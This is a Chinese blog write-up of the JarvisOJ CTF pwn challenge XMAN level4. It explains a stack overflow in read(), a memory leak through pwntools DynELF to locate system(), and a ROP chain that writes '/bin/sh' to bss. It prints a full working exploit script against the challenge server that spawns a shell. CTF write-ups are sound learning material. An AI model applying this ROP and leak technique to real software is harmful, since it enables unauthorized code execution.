---
title: XMAN level4 の Write-Up
date: 2020-06-22 10:46:32
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- ROP
- Stack
---
## Introduction

这是JarvisOJ的PWN题部分[XMAN]level4的Write-Up，题目思路上和level3一样，只不过在细节处理上有稍微的不一样。本题中由于不知道libc的版本，，所以需要pwntools的DynELF模块寻找函数的内存地址。

<!-- more -->

## Step 1

程序运行图：

![](/img/XMAN-level4/XMAN1.png)

checksec：32位程序，仅开启DEP保护

![](/img/XMAN-level4/XMAN2.png)

## Step 2

把程序丢到hopper中，发现vulnerable_function函数中的read函数存在溢出漏洞：

![](/img/XMAN-level4/XMAN3.png)

但是程序中既找不到system函数也找不到`/bin/sh`的字符串：

![](/img/XMAN-level4/XMAN4.png)

![](/img/XMAN-level4/XMAN5.png)

所以第一反应是和[level3](https://coldwave96.github.io/2020/05/20/XMAN-level3/)一样，leak出libc地址然后调用libc中的system函数。

但是有个问题是我们不知道libc库的版本，所以我们需要通过pwntools的DynELF来寻找system函数的地址。

DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄露函数的情况下，可以解析任意加载库的人铱符号地址。具体原理解析可以看FREEBUF上的[Pwntools之DynELF原理探究](https://www.freebuf.com/articles/system/193646.html)一文。

这样我们的思路就很清楚了：

* 通过vulerable_function()的read()栈溢出构造ROP创造任意地址内存泄露函数

* 结合上一步的函数，利用DynELF获取libc中的system()函数的真实地址

* 通过vulerable_function()的read()栈溢出构造ROP将‘/bin/sh\x00’通过read()写入bss段

* 通过vulerable_function()的read()栈溢出构造ROP执行system(‘/bin/sh’)得到shell

## Step 3

直接给出EXP脚本：

```Python
* # coding:utf-8
* from pwn import *
* 
* sh = remote('pwn2.jarvisoj.com', 9880)
* elf = ELF('./level4')
* 
* write_plt = elf.plt['write']
* vuln_addr = elf.symbols['vulnerable_function']
* 
* # 定义leak()泄露任意函数地址
* def leak(addr):
*     payload = 'a' * (0x88 + 0x4) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(addr) + p32(4)
*     sh.sendline(payload)
*     leak_addr = sh.recv(4)
*     return leak_addr
* 
* # 获取sysetem()函数地址
* dynelf = DynELF(leak, elf = elf)
* sys_addr = dynelf.lookup('system', 'libc')
* 
* print('system addr: ' + hex(sys_addr))
* 
* read_plt = elf.plt['read']
* bss_addr = 0x804a024
* 
* # 往内存中写入shellcode
* payload1 = 'a' * (0x88 + 0x4) + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(8)
* sh.sendline(payload1)
* sh.send('/bin/sh\x00')
* 
* # 执行system()函数get shell
* payload2 = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(bss_addr)
* sh.sendline(payload2)
* 
* sh.interactive()
* sh.close()
```

脚本运行结果图：

![](/img/XMAN-level4/XMAN6.png)